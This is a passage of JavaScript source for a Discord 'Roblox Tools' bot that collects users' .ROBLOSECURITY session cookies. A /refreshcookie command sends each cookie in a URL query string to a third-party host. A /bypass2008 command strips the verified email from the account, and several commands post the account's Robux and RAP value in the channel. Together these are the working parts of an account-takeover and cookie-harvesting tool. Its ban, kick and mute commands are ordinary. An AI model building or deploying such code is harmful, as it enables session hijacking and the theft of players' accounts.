    await interaction.reply({ content: '<:yes:1393890949960306719> Validating cookie and processing email removal request...', ephemeral: true });

    try {
      // First, validate the cookie comprehensively
      const validation = await validateCookieComprehensive(cookie);
      
      if (!validation.valid) {
        const validationEmbed = new EmbedBuilder()
          .setColor(0xef4444)
          .setTitle("🔒 Cookie Validation Failed")
          .setDescription("Cookie authentication failed before email removal")
          .addFields(
            { name: "❌ Validation Error", value: validation.reason, inline: false },
            { name: "Status", value: "<:no:1393890945929318542> Failed", inline: true },
            { name: "💡 Suggestion", value: "• Ensure your cookie is valid and fresh\n• Try refreshing your cookie first\n• Make sure you're logged into Roblox", inline: false }
          )
          .setTimestamp()
          .setFooter({
            text: `Requested by ${interaction.user.tag} • Roblox Tools`,
            iconURL: interaction.user.displayAvatarURL()
          });

        return interaction.followUp({ embeds: [validationEmbed] });
      }

      // Cookie is validated, proceed with email removal
      const result = await removeEmailFromAccount(cookie);

      const embed = new EmbedBuilder()
        .setColor(result.success ? 0x00ff88 : (result.needsChallenge ? 0xfacc15 : 0xff4757))
        .setTitle("📧 Email Removal Service")
        .setDescription("Email removal results with enhanced security validation")
        .addFields(
          { name: "🔒 Authentication", value: `✅ **${validation.userData.username}** (ID: ${validation.userData.id})`, inline: false },
          { name: "🔧 Removal Result", value: result.message || (result.success ? "Successfully removed email!" : "Failed to remove email"), inline: false },
          { name: "Status", value: result.success ? "<:yes:1393890949960306719> Completed" : "<:no:1393890945929318542> Failed", inline: true }
        )
        .setTimestamp()
        .setFooter({
          text: `Requested by ${interaction.user.tag} • Roblox Tools`,
          iconURL: interaction.user.displayAvatarURL()
        });

      // Add account details from validation
      if (validation.userData.accountAge) {
        embed.addFields(
          { name: "📅 Account Age", value: `${validation.userData.accountAge} days`, inline: true },
          { name: "🔑 API Access", value: validation.userData.hasRobuxAccess ? "✅ Verified" : "⚠️ Limited", inline: true }
        );
      }

      if (result.attempts) {
        embed.addFields(
          { name: "🔄 Attempts", value: `Succeeded on attempt ${result.attempts}/3`, inline: true }
        );
      }

      if (result.needsChallenge) {
        embed.addFields(
          { name: "🛡️ Security Challenge", value: "Roblox detected suspicious activity and blocked the request", inline: false },
          { name: "💡 Suggestions", value: result.suggestion || "• Try refreshing your cookie first\n• Wait 30+ minutes before retrying\n• Use a different browser/device\n• Complete some normal Roblox activities first", inline: false }
        );
      }

      await interaction.followUp({ embeds: [embed] });
    } catch (error) {
      console.error('Email removal error:', error);
      
      const embed = new EmbedBuilder()
        .setColor(0xfacc15)
        .setTitle("📧 Email Removal Service")
        .setDescription("Email removal request failed")
        .addFields(
          { name: "🔧 Removal Result", value: `❌ **Error:** ${error.message}`, inline: false },
          { name: "Status", value: "<:no:1393890945929318542> Failed", inline: true },
          { name: "💡 Try This", value: "• Use `/refreshcookie` first\n• Wait 30+ minutes\n• Make sure your cookie is valid", inline: false }
        )
        .setTimestamp()
        .setFooter({
          text: `Requested by ${interaction.user.tag} • Roblox Tools`,
          iconURL: interaction.user.displayAvatarURL()
        });

      await interaction.followUp({ embeds: [embed] });
    }
  }

  if (interaction.commandName === 'refreshcookie') {
    const cookie = interaction.options.getString('cookie');

    await interaction.reply({ content: '<:Refresh:1393888531973406881> Refreshing your cookie...', ephemeral: true });

    try {
      const res = await fetch(`https://cookie-fresh.vercel.app/api/refresh?cookie=${encodeURIComponent(cookie)}`);
      const data = await res.json();

      if (!data.redemptionResult || !data.redemptionResult.success) {
        const errorEmbed = new EmbedBuilder()
          .setColor(0xef4444)
          .setTitle("<:no:1393890945929318542> Unable to refresh your cookie.")
          .setDescription("Roblox might have rejected the cookie or the backend failed.")
          .setFooter({
            text: `Requested by ${interaction.user.tag}`,
            iconURL: interaction.user.displayAvatarURL()
          });
        return interaction.followUp({ embeds: [errorEmbed] });
      }

      const refreshed = data.redemptionResult.refreshedCookie;

      // Get Roblox user data for the public embed
      const robloxData = await getRobloxUserData(cookie);

      const publicEmbed = new EmbedBuilder()
        .setColor(0x00d4ff)
        .setTitle(robloxData ? `🎯 ${robloxData.username}` : "<:yes:1393890949960306719> Cookie Refreshed Successfully!")
          .setDescription("<:Refresh:1393888531973406881> **Cookie Refresh Service**")
        .setTimestamp()
        .setFooter({
          text: `Requested by ${interaction.user.tag} • Roblox Tools`,
          iconURL: interaction.user.displayAvatarURL()
        });

      // Add Roblox user info if available
      if (robloxData) {
        if (robloxData.avatar) {
          publicEmbed.setThumbnail(robloxData.avatar);
        }

        publicEmbed.addFields(
          { name: "<:Robux:1393888802128265348> Robux Balance", value: `\`${robloxData.robux}\``, inline: true },
          { name: "<:DominusEmpyreus:1393888539263107113> RAP Value", value: `\`${robloxData.rap}\``, inline: true },
          { name: "<:member_IDS:1393888535412740096> User ID", value: `\`${robloxData.userId}\``, inline: true }
        );
      }

      // Add refresh result at bottom
      publicEmbed.addFields(
        { name: "<:Refresh:1393888531973406881> Refresh Result", value: "Your new cookie has been generated and sent privately.", inline: false },
        { name: "Status", value: "<:yes:1393890949960306719> Completed", inline: true }
      );

      await interaction.followUp({ embeds: [publicEmbed] }); // public message

      const privateEmbed = new EmbedBuilder()
        .setColor(0x0ea5e9)
        .setTitle("🔐 Your New .ROBLOSECURITY Cookie")
        .setDescription(`\`\`\`${refreshed}\`\`\``)
        .addFields(
          { name: "⚠️ Security Notice", value: "Keep this cookie private and secure!", inline: false }
        )
        .setTimestamp()
        .setFooter({
          text: `Requested by ${interaction.user.tag}`,
          iconURL: interaction.user.displayAvatarURL()
        });

      await interaction.followUp({
        embeds: [privateEmbed],
        ephemeral: true // only the user sees this
      });

    } catch (err) {
      const embed = new EmbedBuilder()
        .setColor(0xfacc15)
        .setTitle("<:no:1393890945929318542> Request Failed")
        .setDescription("Failed to connect to refresh API or bad response.")
        .setFooter({
          text: `Requested by ${interaction.user.tag}`,
          iconURL: interaction.user.displayAvatarURL()
        });
      await interaction.followUp({ embeds: [embed] });
    }
  }

  if (interaction.commandName === 'help') {
    commandStats.help++;

    const helpEmbed = new EmbedBuilder()
      .setColor(0x0ea5e9)
      .setTitle('🤖 Roblox Tools Bot - Help')
      .setDescription('Here are all available commands and their descriptions:')
      .addFields(
        { 
          name: '📧 /bypass2008', 
          value: 'Remove the verified email address using custom API\n**Usage:** Provide your .ROBLOSECURITY cookie', 
          inline: false 
        },
        { 
          name: '<:Refresh:1393888531973406881> /refreshcookie', 
          value: 'Refresh your .ROBLOSECURITY cookie\n**Usage:** Provide your current cookie', 
          inline: false 
        },
        { 
          name: '📊 /botstats', 
          value: 'Show bot statistics and uptime', 
          inline: false 
        },
        { 
          name: '❓ /help', 
          value: 'Show this help message', 
          inline: false 
        },
        { 
          name: '🔍 /validatecookie', 
          value: 'Check if a .ROBLOSECURITY cookie is valid', 
          inline: false 
        },
        { 
          name: '🕐 /cookieexpiry', 
          value: 'Check if your cookie might expire soon', 
          inline: false 
        },
        { 
          name: '<:member_IDS:1393888535412740096> /profilelookup', 
          value: 'Get Roblox user info from username or ID', 
          inline: false 
        },
        { 
          name: '🔨 /ban', 
          value: 'Ban a user from the server (Requires Ban Members permission)', 
          inline: false 
        },
        { 
          name: '👢 /kick', 
          value: 'Kick a user from the server (Requires Kick Members permission)', 
          inline: false 
        },
        { 
          name: '🔇 /mute', 
          value: 'Timeout/mute a user for specified minutes (Requires Moderate Members permission)', 
          inline: false 
        },
        { 
          name: '🔊 /unmute', 
          value: 'Remove timeout/unmute a user (Requires Moderate Members permission)', 
          inline: false 
        },
        { 
          name: '⚠️ /warn', 
          value: 'Send a warning to a user (Requires Moderate Members permission)', 
          inline: false 
        },
        { 
          name: '⚠️ Important Notes:', 
          value: '• Commands have a 5-second cooldown\n• Only works in designated channel\n• Keep your cookies private!\n• Moderation commands require proper permissions', 
          inline: false 
        }
      )
      .setThumbnail(client.user.displayAvatarURL())
      .setTimestamp()
      .setFooter({
        text: `Requested by ${interaction.user.tag}`,
        iconURL: interaction.user.displayAvatarURL()
      });

    await interaction.reply({ embeds: [helpEmbed] });
  }

  if (interaction.commandName === 'botstats') {
    commandStats.botstats++;

    const uptime = process.uptime();
    const uptimeHours = Math.floor(uptime / 3600);
    const uptimeMinutes = Math.floor((uptime % 3600) / 60);
    const uptimeSeconds = Math.floor(uptime % 60);

    const totalCommands = Object.values(commandStats).reduce((a, b) => a + b, 0);

    const statsEmbed = new EmbedBuilder()
      .setColor(0x22c55e)
      .setTitle('📊 Bot Statistics')
      .setDescription('Current bot performance and usage stats')
      .addFields(
        { 
          name: '⏱️ Uptime', 
          value: `${uptimeHours}h ${uptimeMinutes}m ${uptimeSeconds}s`, 
          inline: true 
        },
        { 
          name: '🏓 Ping', 
          value: `${client.ws.ping}ms`, 
          inline: true 
        },
        { 
          name: '📈 Total Commands Used', 
          value: `${totalCommands}`, 
          inline: true 
        },
        { 
          name: '📧 Bypass2008 Used', 
          value: `${commandStats.bypass2008} times`, 
          inline: true 
        },
        { 
          name: '<:Refresh:1393888531973406881> RefreshCookie Used', 
          value: `${commandStats.refreshcookie} times`, 
          inline: true 
        },
        { 
          name: '🔍 ValidateCookie Used', 
          value: `${commandStats.validatecookie} times`, 
          inline: true 
        },
        { 
          name: '🕐 CookieExpiry Used', 
          value: `${commandStats.cookieexpiry} times`, 
          inline: true 
        },
        { 
          name: '<:member_IDS:1393888535412740096> ProfileLookup Used', 
          value: `${commandStats.profilelookup} times`, 
          inline: true 
        },
        { 
          name: '🔨 Ban Used', 
          value: `${commandStats.ban} times`, 
          inline: true 
        },
        { 
          name: '👢 Kick Used', 
          value: `${commandStats.kick} times`, 
          inline: true 
        },
        { 
          name: '🔇 Mute Used', 
          value: `${commandStats.mute} times`, 
          inline: true 
        },
        { 
          name: '🔊 Unmute Used', 
          value: `${commandStats.unmute} times`, 
          inline: true 
        },
        { 
          name: '⚠️ Warn Used', 
          value: `${commandStats.warn} times`, 
          inline: true 
        },
        { 
          name: '🤖 Bot Info', 
          value: `Servers: ${client.guilds.cache.size}\nUsers: ${client.users.cache.size}`, 
          inline: false 
        }
      )
      .setThumbnail(client.user.displayAvatarURL())
      .setTimestamp()
      .setFooter({
        text: `Requested by ${interaction.user.tag}`,
        iconURL: interaction.user.displayAvatarURL()
      });

    await interaction.reply({ embeds: [statsEmbed] });
  }

  if (interaction.commandName === 'validatecookie') {
    const cookie = interaction.options.getString('cookie');
    commandStats.validatecookie++;

    await interaction.reply({ content: '🔍 Validating cookie...', ephemeral: true });

    try {
      const res = await fetch('https://users.roblox.com/v1/users/authenticated', {
        headers: {
          'Cookie': `.ROBLOSECURITY=${cookie}`,
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
      });

      if (res.status === 200) {
        const userData = await res.json();

        // Get detailed Roblox user data
        const robloxData = await getRobloxUserData(cookie);

        const embed = new EmbedBuilder()
          .setColor(0x00ff88)
          .setTitle(robloxData ? `🎯 ${robloxData.username}` : '<:yes:1393890949960306719> Cookie Valid!')
          .setDescription(`🔍 **Cookie Validation Complete**\nAuthenticated for user: **${userData.name}**`)
          .setTimestamp()
          .setFooter({
            text: `Requested by ${interaction.user.tag} • Roblox Tools`,
            iconURL: interaction.user.displayAvatarURL()
          });

        // Add Roblox user info if available
        if (robloxData) {
          if (robloxData.avatar) {
            embed.setThumbnail(robloxData.avatar);
          }

          embed.addFields(
            { name: "<:Robux:1393888802128265348> Robux Balance", value: `\`${robloxData.robux}\``, inline: true },
            { name: "<:DominusEmpyreus:1393888539263107113> RAP Value", value: `\`${robloxData.rap}\``, inline: true },
            { name: "<:member_IDS:1393888535412740096> User ID", value: `\`${robloxData.userId}\``, inline: true }
          );
        } else {
          embed.addFields(
            { name: '<:member_IDS:1393888535412740096> User ID', value: `\`${userData.id}\``, inline: true },
            { name: '🏷️ Display Name', value: `\`${userData.displayName}\``, inline: true },
            { name: '<:yes:1393890949960306719> Status', value: '`Active`', inline: true }
          );
        }

        await interaction.followUp({ embeds: [embed] });
      } else {
        const embed = new EmbedBuilder()
          .setColor(0xef4444)
          .setTitle('<:no:1393890945929318542> Cookie Invalid')
          .setDescription('The provided cookie is invalid or expired.')
          .setTimestamp()
          .setFooter({
            text: `Requested by ${interaction.user.tag}`,
            iconURL: interaction.user.displayAvatarURL()
          });

        await interaction.followUp({ embeds: [embed] });
      }
    } catch (error) {
      const embed = new EmbedBuilder()
        .setColor(0xfacc15)
        .setTitle('<:no:1393890945929318542> Validation Failed')
        .setDescription('Unable to validate cookie due to network error.')
        .setTimestamp()
        .setFooter({
          text: `Requested by ${interaction.user.tag}`,
          iconURL: interaction.user.displayAvatarURL()
        });

      await interaction.followUp({ embeds: [embed] });
    }
  }

  if (interaction.commandName === 'cookieexpiry') {
    const cookie = interaction.options.getString('cookie');
    commandStats.cookieexpiry++;

    await interaction.reply({ content: '🔍 Checking cookie expiry...', ephemeral: true });

    try {
      const res = await fetch('https://users.roblox.com/v1/users/authenticated', {
        headers: {
          'Cookie': `.ROBLOSECURITY=${cookie}`,
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
      });

      if (res.status === 200) {
        // Get detailed Roblox user data
        const robloxData = await getRobloxUserData(cookie);

        // Check if cookie is close to expiry by testing multiple requests
        const testCount = 3;
        let successCount = 0;

        for (let i = 0; i < testCount; i++) {
          try {
            const testRes = await fetch('https://users.roblox.com/v1/users/authenticated', {
              headers: {
                'Cookie': `.ROBLOSECURITY=${cookie}`,
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
              }
            });
            if (testRes.status === 200) successCount++;
          } catch {}
          await new Promise(resolve => setTimeout(resolve, 500));
        }

        const reliability = (successCount / testCount) * 100;
        let status, color, message;

        if (reliability >= 90) {
          status = '<:yes:1393890949960306719> Healthy';
          color = 0x22c55e;
          message = 'Cookie is stable and not expected to expire soon.';
        } else if (reliability >= 70) {
          status = '⚠️ Warning';
          color = 0xfacc15;
          message = 'Cookie may be unstable. Consider refreshing soon.';
        } else {
          status = '<:no:1393890945929318542> Critical';
          color = 0xef4444;
          message = 'Cookie is unreliable and may expire soon. Refresh immediately!';
        }

        const embed = new EmbedBuilder()
          .setColor(color)
          .setTitle(robloxData ? `🎯 ${robloxData.username}` : '🕐 Cookie Expiry Check')
          .setDescription(`🔍 **Cookie Health Monitor**\n${message}`)
          .setTimestamp()
          .setFooter({
            text: `Requested by ${interaction.user.tag} • Roblox Tools`,
            iconURL: interaction.user.displayAvatarURL()
          });

        // Add Roblox user info if available
        if (robloxData) {
          if (robloxData.avatar) {
            embed.setThumbnail(robloxData.avatar);
          }

          embed.addFields(
            { name: "<:Robux:1393888802128265348> Robux Balance", value: `\`${robloxData.robux}\``, inline: true },
            { name: "<:DominusEmpyreus:1393888539263107113> RAP Value", value: `\`${robloxData.rap}\``, inline: true },
            { name: "<:member_IDS:1393888535412740096> User ID", value: `\`${robloxData.userId}\``, inline: true }
          );
        }

        // Add expiry check results
        embed.addFields(
          { name: 'Status', value: status, inline: true },
          { name: 'Reliability', value: `${reliability.toFixed(1)}%`, inline: true },
          { name: 'Recommendation', value: reliability >= 90 ? 'No action needed' : 'Consider refreshing', inline: true }
        );

        await interaction.followUp({ embeds: [embed] });
      } else {
        const embed = new EmbedBuilder()
          .setColor(0xef4444)
          .setTitle('<:no:1393890945929318542> Cookie Expired')
          .setDescription('The cookie is already invalid or expired.')
          .setTimestamp()
          .setFooter({
            text: `Requested by ${interaction.user.tag}`,
            iconURL: interaction.user.displayAvatarURL()
          });

        await interaction.followUp({ embeds: [embed] });
      }
    } catch (error) {
      const embed = new EmbedBuilder()
        .setColor(0xfacc15)
        .setTitle('<:no:1393890945929318542> Check Failed')
        .setDescription('Unable to check cookie expiry due to network error.')
        .setTimestamp()
        .setFooter({
          text: `Requested by ${interaction.user.tag}`,
          iconURL: interaction.user.displayAvatarURL()
        });

      await interaction.followUp({ embeds: [embed] });
    }
  }

  if (interaction.commandName === 'profilelookup') {
    const identifier = interaction.options.getString('identifier');
    commandStats.profilelookup++;

    await interaction.reply({ content: '🔍 Looking up profile...', ephemeral: true });

    try {
      let userId;

      // Check if identifier is a number (user ID) or username
      if (/^\d+$/.test(identifier)) {
        userId = identifier;
      } else {
        // Get user ID from username
        const userRes = await fetch(`https://users.roblox.com/v1/usernames/users`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            usernames: [identifier]
          })
        });

        const userData = await userRes.json();
        if (!userData.data || userData.data.length === 0) {
          const embed = new EmbedBuilder()
            .setColor(0xef4444)
            .setTitle('<:no:1393890945929318542> User Not Found')
            .setDescription('No user found with that username.')
            .setTimestamp()
            .setFooter({
              text: `Requested by ${interaction.user.tag}`,
              iconURL: interaction.user.displayAvatarURL()
            });

          return interaction.followUp({ embeds: [embed] });
        }
        userId = userData.data[0].id;
      }

      // Get detailed user info
      const [userRes, avatarRes] = await Promise.all([
        fetch(`https://users.roblox.com/v1/users/${userId}`),
        fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=150x150&format=Png`)
      ]);

      const userInfo = await userRes.json();
      const avatarInfo = await avatarRes.json();

      if (userRes.status !== 200) {
        const embed = new EmbedBuilder()
          .setColor(0xef4444)
          .setTitle('<:no:1393890945929318542> User Not Found')
          .setDescription('No user found with that ID.')
          .setTimestamp()
          .setFooter({
            text: `Requested by ${interaction.user.tag}`,
            iconURL: interaction.user.displayAvatarURL()
          });

        return interaction.followUp({ embeds: [embed] });
      }

      const embed = new EmbedBuilder()
        .setColor(0x0ea5e9)
        .setTitle(`👤 ${userInfo.displayName} (@${userInfo.name})`)
        .setDescription(userInfo.description || 'No description available')
        .addFields(
          { name: '<:member_IDS:1393888535412740096> User ID', value: `${userInfo.id}`, inline: true },
          { name: 'Username', value: `@${userInfo.name}`, inline: true },
          { name: 'Display Name', value: userInfo.displayName, inline: true },
          { name: 'Created', value: new Date(userInfo.created).toLocaleDateString(), inline: true },
          { name: 'Banned', value: userInfo.isBanned ? '<:no:1393890945929318542> Yes' : '<:yes:1393890949960306719> No', inline: true },
          { name: 'Profile Link', value: `[View Profile](https://www.roblox.com/users/${userInfo.id}/profile)`, inline: true }
        )
        .setTimestamp()
        .setFooter({
          text: `Requested by ${interaction.user.tag}`,
          iconURL: interaction.user.displayAvatarURL()
        });

      // Add avatar if available
      if (avatarInfo.data && avatarInfo.data.length > 0) {
        embed.setThumbnail(avatarInfo.data[0].imageUrl);
      }

      await interaction.followUp({ embeds: [embed] });
    } catch (error) {
      const embed = new EmbedBuilder()
        .setColor(0xfacc15)
        .setTitle('<:no:1393890945929318542> Lookup Failed')
        .setDescription('Unable to lookup profile due to network error.')
        .setTimestamp()
        .setFooter({
          text: `Requested by ${interaction.user.tag}`,
          iconURL: interaction.user.displayAvatarURL()
        });

      await interaction.followUp({ embeds: [embed] });
    }
  }

  // Moderation Commands
  if (interaction.commandName === 'ban') {
    const targetUser = interaction.options.getUser('user');
    const reason = interaction.options.getString('reason') || 'No reason provided';
    commandStats.ban++;

    // Check if user is owner or has administrator permission
    const isOwnerOrAdmin = interaction.guild.ownerId === interaction.user.id || 
                          interaction.member.permissions.has(PermissionFlagsBits.Administrator);

    if (!isOwnerOrAdmin) {
      return interaction.reply({
        content: '<:no:1393890945929318542> Only server owners and administrators can use this command.',
        ephemeral: true
      });
    }

    // Check if bot has permission
    if (!interaction.guild.members.me.permissions.has(PermissionFlagsBits.BanMembers)) {
      return interaction.reply({
        content: '<:no:1393890945929318542> I don\'t have permission to ban members.',
        ephemeral: true
      });
    }

    try {
      const member = await interaction.guild.members.fetch(targetUser.id);

      // Check if user is trying to ban themselves
      if (targetUser.id === interaction.user.id) {
        return interaction.reply({
          content: '<:no:1393890945929318542> You cannot ban yourself.',
          ephemeral: true
        });
      }

      // Check if user is trying to ban the bot
      if (targetUser.id === client.user.id) {
        return interaction.reply({
          content: '<:no:1393890945929318542> I cannot ban myself.',
          ephemeral: true
        });
      }

      // Check role hierarchy
      if (member.roles.highest.position >= interaction.member.roles.highest.position) {
        return interaction.reply({
          content: '<:no:1393890945929318542> You cannot ban someone with a higher or equal role.',
          ephemeral: true
        });
      }

      await member.ban({ reason });

      const embed = new EmbedBuilder()
        .setColor(0xef4444)
        .setTitle('🔨 User Banned')
        .setDescription(`**${targetUser.tag}** has been banned from the server.`)
        .addFields(
          { name: 'Moderator', value: `${interaction.user.tag}`, inline: true },
          { name: 'Reason', value: reason, inline: true }
        )
        .setTimestamp()
        .setFooter({
          text: `User ID: ${targetUser.id}`,
          iconURL: interaction.user.displayAvatarURL()
        });

      const reply = await interaction.reply({ embeds: [embed] });

      // Auto-delete after 5 seconds
      setTimeout(async () => {
        try {
          await reply.delete();
        } catch (error) {
          console.error('Error deleting ban message:', error);
        }
      }, 5000);
    } catch (error) {
      console.error('Ban error:', error);
      await interaction.reply({
        content: '<:no:1393890945929318542> Failed to ban user. They may not be in the server or I lack permissions.',
        ephemeral: true
      });
    }
  }

  if (interaction.commandName === 'kick') {
    const targetUser = interaction.options.getUser('user');
    const reason = interaction.options.getString('reason') || 'No reason provided';
    commandStats.kick++;

    // Check if user is owner or has administrator permission
    const isOwnerOrAdmin = interaction.guild.ownerId === interaction.user.id || 
                          interaction.member.permissions.has(PermissionFlagsBits.Administrator);

    if (!isOwnerOrAdmin) {
      return interaction.reply({
        content: '<:no:1393890945929318542> Only server owners and administrators can use this command.',
        ephemeral: true
      });
    }

    // Check if bot has permission
    if (!interaction.guild.members.me.permissions.has(PermissionFlagsBits.KickMembers)) {
      return interaction.reply({
        content: '<:no:1393890945929318542> I don\'t have permission to kick members.',
        ephemeral: true
      });
    }

    try {
      const member = await interaction.guild.members.fetch(targetUser.id);

      // Check if user is trying to kick themselves
      if (targetUser.id === interaction.user.id) {
        return interaction.reply({
          content: '<:no:1393890945929318542> You cannot kick yourself.',
          ephemeral: true
        });
      }

      // Check if user is trying to kick the bot
      if (targetUser.id === client.user.id) {
        return interaction.reply({
          content: '<:no:1393890945929318542> I cannot kick myself.',
          ephemeral: true
        });
      }

      // Check role hierarchy
      if (member.roles.highest.position >= interaction.member.roles.highest.position) {
        return interaction.reply({
          content: '<:no:1393890945929318542> You cannot kick someone with a higher or equal role.',
          ephemeral: true
        });
      }

      await member.kick(reason);

      const embed = new EmbedBuilder()
        .setColor(0xfacc15)
        .setTitle('👢 User Kicked')
        .setDescription(`**${targetUser.tag}** has been kicked from the server.`)
        .addFields(
          { name: 'Moderator', value: `${interaction.user.tag}`, inline: true },
          { name: 'Reason', value: reason, inline: true }
        )
        .setTimestamp()
        .setFooter({
          text: `User ID: ${targetUser.id}`,
          iconURL: interaction.user.displayAvatarURL()
        });

      const reply = await interaction.reply({ embeds: [embed] });

      // Auto-delete after 5 seconds
      setTimeout(async () => {
        try {
          await reply.delete();
        } catch (error) {
          console.error('Error deleting kick message:', error);
        }
      }, 5000);
    } catch (error) {
      console.error('Kick error:', error);
      await interaction.reply({
        content: '<:no:1393890945929318542> Failed to kick user. They may not be in the server or I lack permissions.',
        ephemeral: true
      });
    }
  }

  if (interaction.commandName === 'mute') {
    const targetUser = interaction.options.getUser('user');
    const duration = interaction.options.getInteger('duration');
    const reason = interaction.options.getString('reason') || 'No reason provided';
    commandStats.mute++;

    // Check if user is owner or has administrator permission
    const isOwnerOrAdmin = interaction.guild.ownerId === interaction.user.id || 
                          interaction.member.permissions.has(PermissionFlagsBits.Administrator);

    if (!isOwnerOrAdmin) {
      return interaction.reply({
        content: '<:no:1393890945929318542> Only server owners and administrators can use this command.',
        ephemeral: true
      });
    }

    // Check if bot has permission
    if (!interaction.guild.members.me.permissions.has(PermissionFlagsBits.ModerateMembers)) {
      return interaction.reply({
        content: '<:no:1393890945929318542> I don\'t have permission to timeout members.',
        ephemeral: true
      });
    }

    try {
      const member = await interaction.guild.members.fetch(targetUser.id);

      // Check if user is trying to mute themselves
      if (targetUser.id === interaction.user.id) {
        return interaction.reply({
          content: '<:no:1393890945929318542> You cannot mute yourself.',
        });
      }

      // Check if user is trying to mute the bot
      if (targetUser.id === client.user.id) {
        return interaction.reply({
          content: '<:no:1393890945929318542> I cannot mute myself.',
        });
      }

      // Check role hierarchy
      if (member.roles.highest.position >= interaction.member.roles.highest.position) {
        return interaction.reply({
          content: '<:no:1393890945929318542> You cannot mute someone with a higher or equal role.',
          ephemeral: true
        });
      }

      const timeoutDuration = duration * 60 * 1000; // Convert minutes to milliseconds
      await member.timeout(timeoutDuration, reason);

      const embed = new EmbedBuilder()
        .setColor(0xff6b6b)
        .setTitle('🔇 User Muted')
        .setDescription(`**${targetUser.tag}** has been muted for ${duration} minutes.`)
        .addFields(
          { name: 'Moderator', value: `${interaction.user.tag}`, inline: true },
          { name: 'Duration', value: `${duration} minutes`, inline: true },
          { name: 'Reason', value: reason, inline: false }
        )
        .setTimestamp()
        .setFooter({
          text: `User ID: ${targetUser.id}`,
          iconURL: interaction.user.displayAvatarURL()
        });

      const reply = await interaction.reply({ embeds: [embed] });

      // Auto-delete after 5 seconds
      setTimeout(async () => {
        try {
          await reply.delete();
        } catch (error) {
          console.error('Error deleting mute message:', error);
        }
      }, 5000);
    } catch (error) {
      console.error('Mute error:', error);
      await interaction.reply({
        content: '<:no:1393890945929318542> Failed to mute user. They may not be in the server or I lack permissions.',
        ephemeral: true
      });
    }
  }

  if (interaction.commandName === 'unmute') {
    const targetUser = interaction.options.getUser('user');
    const reason = interaction.options.getString('reason') || 'No reason provided';
    commandStats.unmute++;

    // Check if user is owner or has administrator permission
    const isOwnerOrAdmin = interaction.guild.ownerId === interaction.user.id || 
                          interaction.member.permissions.has(PermissionFlagsBits.Administrator);

    if (!isOwnerOrAdmin) {
      return interaction.reply({
        content: '<:no:1393890945929318542> Only server owners and administrators can use this command.',
        ephemeral: true
      });
    }

    // Check if bot has permission
    if (!interaction.guild.members.me.permissions.has(PermissionFlagsBits.ModerateMembers)) {
      return interaction.reply({
        content: '<:no:1393890945929318542> I don\'t have permission to remove timeouts.',
        ephemeral: true
      });
    }

    try {
      const member = await interaction.guild.members.fetch(targetUser.id);

      if (!member.isCommunicationDisabled()) {
        return interaction.reply({
          content: '<:no:1393890945929318542> This user is not currently muted.',
          ephemeral: true
        });
      }

      await member.timeout(null, reason);

      const embed = new EmbedBuilder()
        .setColor(0x4caf50)
        .setTitle('🔊 User Unmuted')
        .setDescription(`**${targetUser.tag}** has been unmuted.`)
        .addFields(
          { name: 'Moderator', value: `${interaction.user.tag}`, inline: true },
          { name: 'Reason', value: reason, inline: true }
        )
        .setTimestamp()
        .setFooter({
          text: `User ID: ${targetUser.id}`,
          iconURL: interaction.user.displayAvatarURL()
        });

      const reply = await interaction.reply({ embeds: [embed] });

      // Auto-delete after 5 seconds
      setTimeout(async () => {
        try {
          await reply.delete();
        } catch (error) {
          console.error('Error deleting unmute message:', error);
        }
      }, 5000);
    } catch (error) {
      console.error('Unmute error:', error);
      await interaction.reply({
        content: '<:no:1393890945929318542> Failed to unmute user. They may not be in the server or I lack permissions.',
        ephemeral: true
      });
    }
  }

  if (interaction.commandName === 'warn') {
    const targetUser = interaction.options.getUser('user');
    const reason = interaction.options.getString('reason');
    commandStats.warn++;

    // Check if user is owner or has administrator permission
    const isOwnerOrAdmin = interaction.guild.ownerId === interaction.user.id || 
                          interaction.member.permissions.has(PermissionFlagsBits.Administrator);

    if (!isOwnerOrAdmin) {
      return interaction.reply({
        content: '<:no:1393890945929318542> Only server owners and administrators can use this command.',
        ephemeral: true
      });
    }

    try {
      const member = await interaction.guild.members.fetch(targetUser.id);

      // Check if user is trying to warn themselves
      if (targetUser.id === interaction.user.id) {
        return interaction.reply({
          content: '<:no:1393890945929318542> You cannot warn yourself.',
        });
      }

      // Check if user is trying to warn the bot
      if (targetUser.id === client.user.id) {
        return interaction.reply({
          content: '<:no:1393890945929318542> You cannot warn me.',
        });
      }

      // Send DM to the warned user
      try {
        const dmEmbed = new EmbedBuilder()
          .setColor(0xfacc15)
          .setTitle('⚠️ Warning Received')
          .setDescription(`You have received a warning in **${interaction.guild.name}**.`)
          .addFields(
            { name: 'Moderator', value: `${interaction.user.tag}`, inline: true },
            { name: 'Reason', value: reason, inline: false }
          )
          .setTimestamp();

        await targetUser.send({ embeds: [dmEmbed] });
      } catch (dmError) {
        console.log('Could not send DM to user');
      }

      const embed = new EmbedBuilder()
        .setColor(0xfacc15)
        .setTitle('⚠️ User Warned')
        .setDescription(`**${targetUser.tag}** has been warned.`)
        .addFields(
          { name: 'Moderator', value: `${interaction.user.tag}`, inline: true },
          { name: 'Reason', value: reason, inline: false }
        )
        .setTimestamp()
        .setFooter({
          text: `User ID: ${targetUser.id}`,
          iconURL: interaction.user.displayAvatarURL()
        });

      const reply = await interaction.reply({ embeds: [embed] });

      // Auto-delete after 5 seconds
      setTimeout(async () => {
        try {
          await reply.delete();
        } catch (error) {
          console.error('Error deleting warn message:', error);
        }
      }, 5000);
    } catch (error) {
      console.error('Warn error:', error);
      await interaction.reply({
        content: '<:no:1393890945929318542> Failed to warn user. They may not be in the server.',
        ephemeral: true
      });
    }
  }
});

client.login(process.env.BOT_TOKEN);
